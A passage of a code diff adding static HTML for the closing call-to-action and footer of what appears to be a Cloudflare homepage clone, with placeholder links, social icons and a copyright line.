+<p style="position: absolute;top: 648vh; left: 952px;">Get easy, instant access to Cloudflare security, <br> and performance services.</p>
+<a class="rtt" href="#" style="font-family: 'SegoeUI-SemiBold';position: absolute;top: 656vh; left: 953px; color: #ff6434;">Get started</a>
+</div>
+
+<footer class="bg-[#070033]" style="height: 408px; width: 1519px; position: absolute;top: 675vh;">
+<div class="f1" style="position: absolute; left: 120px;top: 65px;">
+<ul>
+  <h6 class="text-white font-semibold">Geeting started</h6> <br>
+  <li class="text-[#a5a5a5]">Free plans</li> 
+  <li class="text-[#a5a5a5]">For enterprises</li> 
+  <li class="text-[#a5a5a5]">Compare plans</li> 
+  <li class="text-[#a5a5a5]">Get a recommendation</li> 
+  <li class="text-[#a5a5a5]">Request a demo</li> 
+  <li class="text-[#a5a5a5]">Contact sales</li> 
+</ul>
+</div>
+<div class="f2" style="position: absolute; left: 320px;top: 65px;">
+  <ul>
+    <h6 class="text-white font-semibold">Resources</h6> <br>
+    <li class="text-[#a5a5a5]">Learning center</li> 
+    <li class="text-[#a5a5a5]">Analyst reports</li> 
+    <li class="text-[#a5a5a5]">Cloudflare Radar</li> 
+    <li class="text-[#a5a5a5]">Cloudflare TV</li> 
+    <li class="text-[#a5a5a5]">Case studies</li> 
+    <li class="text-[#a5a5a5]">Webinars</li>
+    <li class="text-[#a5a5a5]">White Papers</li> 
+    <li class="text-[#a5a5a5]">theNET</li>   
+  </ul>
+  </div>
+  <div class="f3" style="position: absolute; left: 515px;top: 65px;">
+    <ul>
+      <h6 class="text-white font-semibold">Solutions</h6> <br>
+      <li class="text-[#a5a5a5]">Connectivity cloud</li> 
+      <li class="text-[#a5a5a5]">SSE and SASE services</li> 
+      <li class="text-[#a5a5a5]">Application services</li> 
+      <li class="text-[#a5a5a5]">Network services</li> 
+      <li class="text-[#a5a5a5]">Developer services</li> 
+    </ul>
+    </div>
+    <div class="f4" style="position: absolute; left: 720px;top: 65px;">
+      <ul>
+        <h6 class="text-white font-semibold">Community</h6> <br>
+        <li class="text-[#a5a5a5]">Community hub</li> 
+        <li class="text-[#a5a5a5]">Project Galileo</li> 
+        <li class="text-[#a5a5a5]">Athenian Project</li> 
+        <li class="text-[#a5a5a5]">Cloudflare for Campaigns</li> 
+        <li class="text-[#a5a5a5]">Critical Infrastructure Defense Project</li> 
+        <li class="text-[#a5a5a5]">Connect 2024</li>
+      </ul>
+      </div>
+      <div class="f5" style="position: absolute; left: 1005px;top: 65px;">
+        <ul>
+          <h6 class="text-white font-semibold">Support</h6> <br>
+          <li class="text-[#a5a5a5]">Help center</li> 
+          <li class="text-[#a5a5a5]">Cloudflare status</li> 
+          <li class="text-[#a5a5a5]">Compliance</li> 
+          <li class="text-[#a5a5a5]">GDPR</li> 
+          <li class="text-[#a5a5a5]">Trust & safety</li>  
+        </ul>
+        </div>
+        <div class="f6" style="position: absolute; left: 1190px;top: 65px;">
+          <ul>
+            <h6 class="text-white font-semibold">Company</h6> <br>
+            <li class="text-[#a5a5a5]">About Cloudflare</li> 
+            <li class="text-[#a5a5a5]">Careers</li> 
+            <li class="text-[#a5a5a5]">Press</li> 
+            <li class="text-[#a5a5a5]">Network map</li> 
+            <li class="text-[#a5a5a5]">Logos & press kit</li>  
+            <li class="text-[#a5a5a5]">Become a partner</li>  
+          </ul>
+          </div>
+
+          <div class="icons" style="position: absolute;left: 1300px;top: 350px;">
+            <a href="#"> <i class="fa-brands fa-square-facebook fa-2xl" style="color: #ffffff;"></i> </a>
+            <a href="#"> <i class="fa-brands fa-square-x-twitter fa-2xl" style="color: #ffffff;"></i> </a>
+            <a href="#"> <i class="fa-brands fa-linkedin fa-2xl" style="color: #ffffff;"></i> </a>
+            <a href="#"> <i class="fa-brands fa-square-youtube fa-2xl" style="color: #ffffff;"></i> </a>
+            <a href="#"> <i class="fa-brands fa-square-instagram fa-2xl" style="color: #ffffff;"></i> </a>
+          </div>
+          <p class="text-[#a5a5a5]" style="position: absolute;left: 700px;top: 350px;">© 2024 Cloudflare, Inc. | Privacy Policy | Terms of Use | Report Security Issues</p>
+</footer>
+
+</body>
+</html>
